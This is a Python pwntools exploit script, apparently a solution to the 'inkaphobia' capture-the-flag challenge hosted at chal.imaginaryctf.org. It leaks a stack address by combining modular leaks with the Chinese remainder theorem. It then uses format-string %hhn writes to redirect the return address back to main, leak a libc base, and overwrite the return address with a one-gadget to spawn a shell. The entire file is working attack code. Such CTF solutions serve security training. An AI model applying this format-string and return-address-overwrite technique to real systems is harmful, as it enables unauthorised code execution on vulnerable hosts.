from pwn import *
from sage.all import crt

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"


# io = process("./inkaphobia")
io = remote("chal.imaginaryctf.org", 42008)


def get_mod(m):
    io.sendlineafter(b"Enter max value: ", str(m))
    io.recvuntil(b"Random number: ")
    return int(io.recvlineS().strip())


def get_addr():
    ps = [101, 103, 107, 109, 113, 127]
    pps = 1741209542339 # product(ps)
    rs = [get_mod(x) for x in ps]
    t = int(crt(rs, ps))
    for i in range(200):
        h = hex(t + pps * i)
        if "0x7ff" in h:
            return t + pps * i


main = 0x400977
addr = get_addr()
ret = addr + 0x21C
print("ret 1", hex(ret))

# write lowest bit to 0x99 to enter main again
payload = b"a" * 0x99 + b"%30$hhn"
payload = payload + b"a" * (8 - len(payload) % 8) + b"%75$p   " + p64(ret)
io.sendline(payload)
io.recvuntil(b"0x")
libc_base = int(io.recv(12).strip(), 16) - 0x270B3
print("libc_base", hex(libc_base))

gadget = libc_base + 0xE6C81
print("gadget", hex(gadget))


main = 0x400977
addr = get_addr()
ret = addr + 0x21C
print("ret 2", hex(ret))

# only writing lower 3 bytes are enough
to_write = [
    (ret, gadget & 0xFF),
    (ret + 1, (gadget >> 8) & 0xFF),
    (ret + 2, (gadget >> 16) & 0xFF),
]
to_write = sorted(to_write, key=lambda x: x[1])
for addr, val in to_write:
    print("to write", hex(addr), hex(val))

chk1 = b"a" * to_write[0][1]
chk2 = b"b" * (to_write[1][1] - to_write[0][1])
chk3 = b"c" * (to_write[2][1] - to_write[1][1])

payload = chk1 + b"%40$hhn" + chk2 + b"%41$hhn" + chk3 + b"%42$hhn"
payload = payload + (0x100 - len(payload)) * b"x"
payload = payload + p64(to_write[0][0]) + p64(to_write[1][0]) + p64(to_write[2][0])
io.sendline(payload)

io.interactive()
